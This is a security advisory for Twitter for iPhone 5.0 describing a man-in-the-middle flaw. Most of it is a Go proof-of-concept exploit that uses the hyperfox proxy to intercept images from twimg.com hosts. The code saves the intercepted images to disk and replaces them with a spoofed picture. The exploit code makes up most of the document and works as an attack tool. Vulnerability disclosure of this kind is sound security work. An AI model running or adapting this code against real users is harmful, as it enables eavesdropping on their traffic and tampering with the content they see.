source: http://www.securityfocus.com/bid/56665/info

Twitter for iPhone is prone to a security vulnerability that lets attackers to perform a man-in-the-middle attack.

Attackers can exploit this issue to capture and modify pictures that the user sees in the application.

Twitter for iPhone 5.0 is vulnerable; other versions may also be affected. 

/*
  Twitter App, eavesdroping PoC

  Written by Carlos Reventlov <carlos@reventlov.com>
  License MIT
*/

package main

import (
  "fmt"
  "github.com/xiam/hyperfox/proxy"
  "github.com/xiam/hyperfox/tools/logger"
  "io"
  "log"
  "os"
  "path"
  "strconv"
  "strings"
)

const imageFile = "spoof.jpg"

func init() {
  _, err := os.Stat(imageFile)
  if err != nil {
    panic(err.Error())
  }
}

func replaceAvatar(pr *proxy.ProxyRequest) error {
  stat, _ := os.Stat(imageFile)
  image, _ := os.Open(imageFile)

  host := pr.Response.Request.Host

  if strings.HasSuffix(host, "twimg.com") == true {

    if pr.Response.ContentLength != 0 {

      file := "saved" + proxy.PS + pr.FileName

      var ext string

      contentType := pr.Response.Header.Get("Content-Type")

      switch contentType {
      case "image/jpeg":
        ext = ".jpg"
      case "image/gif":
        ext = ".gif"
      case "image/png":
        ext = ".png"
      case "image/tiff":
        ext = ".tiff"
      }

      if ext != "" {
        fmt.Printf("** Saving image.\n")

        os.MkdirAll(path.Dir(file), os.ModeDir|os.FileMode(0755))

        fp, _ := os.Create(file)

        if fp == nil {
          fmt.Errorf(fmt.Sprintf("Could not open file %s for writing.", file))
        }

        io.Copy(fp, pr.Response.Body)

        fp.Close()

        pr.Response.Body.Close()
      }

    }

    fmt.Printf("** Sending bogus image.\n")

    pr.Response.ContentLength = stat.Size()
    pr.Response.Header.Set("Content-Type", "image/jpeg")
    pr.Response.Header.Set("Content-Length",
strconv.Itoa(int(pr.Response.ContentLength)))
    pr.Response.Body = image
  }

  return nil
}

func main() {

  p := proxy.New()

  p.AddDirector(logger.Client(os.Stdout))

  p.AddInterceptor(replaceAvatar)

  p.AddLogger(logger.Server(os.Stdout))

  var err error

  err = p.Start()

  if err != nil {
    log.Printf(fmt.Sprintf("Failed to bind: %s.\n", err.Error()))
  }
}